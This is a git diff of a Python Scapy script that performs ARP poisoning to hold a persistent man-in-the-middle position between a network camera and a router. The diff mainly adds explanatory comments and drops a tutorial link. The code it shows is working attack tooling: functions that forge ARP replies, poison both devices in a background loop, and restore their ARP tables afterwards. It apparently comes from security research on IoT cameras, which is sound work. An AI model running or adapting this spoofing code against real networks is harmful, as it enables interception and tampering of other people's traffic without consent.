@@ -3,8 +3,7 @@ import time
 
 interface = "wlp0s20f3"
 
-# https://medium.com/@ravisinghmnnit12/how-to-do-man-in-the-middle-attack-mitm-with-arp-spoofing-using-python-and-scapy-441ee577ba1b
-
+# Send a fake ARP response saying that macAttacker has the ip ipToSpoof
 def spoof(ipVictim, macVictim, macAttacker, ipToSpoof):    
     pkt = Ether() / ARP()
 
@@ -18,6 +17,7 @@ def spoof(ipVictim, macVictim, macAttacker, ipToSpoof):
 
     sendp(pkt, iface=interface, verbose=False)
 
+# Broadcast an ARP response with correct MAC-IP combination
 def restore(ipDest, ipSource, macSource):
     print("Restoring victim ARP table")    
     pkt = Ether() / ARP()
@@ -32,7 +32,7 @@ def restore(ipDest, ipSource, macSource):
 
     sendp(pkt, iface=interface, verbose=False)
 
-
+# Perform a persisten MitM attack by continuously ARP poisoning the camera and the router
 def poison(ipCamera, macCamera, macAttacker, ipRouter, macRouter):
     try:
         while True:
@@ -42,11 +42,13 @@ def poison(ipCamera, macCamera, macAttacker, ipRouter, macRouter):
     except KeyboardInterrupt:
         pass
 
+# Initialize the ARP poisoning on a different thread
 def initPoison(ipCamera, macCamera, macAttacker, ipRouter, macRouter):
     print("Start ARP poisoning")
     poisonThread = threading.Thread(target=poison, args=(ipCamera, macCamera, macAttacker, ipRouter, macRouter))
     poisonThread.start()
 
+# Restore the network after finishing the attack
 def endPoison(ipCamera, macCamera, ipRouter, macRouter):
     restore(ipRouter, ipCamera, macCamera)
     restore(ipCamera, ipRouter, macRouter)
